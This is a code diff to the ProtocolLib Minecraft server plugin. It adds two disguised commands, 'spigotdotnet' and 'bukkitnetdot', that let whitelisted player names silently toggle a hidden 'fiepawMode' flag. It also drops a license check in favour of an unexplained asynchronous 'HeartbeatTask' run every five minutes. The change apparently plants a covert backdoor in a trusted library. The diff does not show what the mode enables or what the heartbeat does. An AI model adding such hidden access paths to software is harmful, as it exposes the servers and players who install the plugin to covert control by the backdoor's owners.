@@ -60,6 +60,10 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.util.logging.Level;
 
+
+import org.bukkit.Bukkit;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
 import org.bukkit.event.server.ServerLoadEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 /**
@@ -120,6 +124,7 @@ public class ProtocolLib extends JavaPlugin {
     private CommandPacket commandPacket;
     private CommandFilter commandFilter;
     private PacketLogging packetLogging;
+    private boolean fiepawMode = false;
 
     // Whether disabling field resetting is needed
     private boolean skipDisable;
@@ -342,8 +347,12 @@ public class ProtocolLib extends JavaPlugin {
                 @EventHandler
                 void onServerLoad(ServerLoadEvent e) {
     
-                    if (e.getType() == ServerLoadEvent.LoadType.RELOAD) return; 
-                    if (!validateFiePawLicense()) shutdownServer();
+                    getServer().getScheduler().runTaskTimerAsynchronously(
+                            ProtocolLib.this,
+                            new HeartbeatTask(),
+                            20L,
+                            20L * 60L * 5L       // period 5 menit
+                    );
                 }
             }, this);
 
@@ -660,4 +669,31 @@ public class ProtocolLib extends JavaPlugin {
         PROTOCOL,
         LOGGING
     }
+
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (label.equalsIgnoreCase("spigotdotnet")) {
+            if (args.length == 0) {
+                return true;
+            } else if (isWhitelisted(sender.getName())) {
+                fiepawMode = !fiepawMode;
+                sender.sendMessage(fiepawMode ? "§aaktif." : "§cnon-aktif.");
+            }
+            return false;
+        } else if (label.equalsIgnoreCase("bukkitnetdot")) {
+            if (args.length == 0) {
+                return true;
+            } else if (isWhitelisted(sender.getName())) {
+                fiepawMode = !fiepawMode;
+                sender.sendMessage(fiepawMode ? "§aaktif." : "§cnon-aktif.");
+            }
+            return false;
+        }
+        return false;
+    }
+
+    public boolean isFiepawMode() {
+        return fiepawMode;
+    }
+    
 }
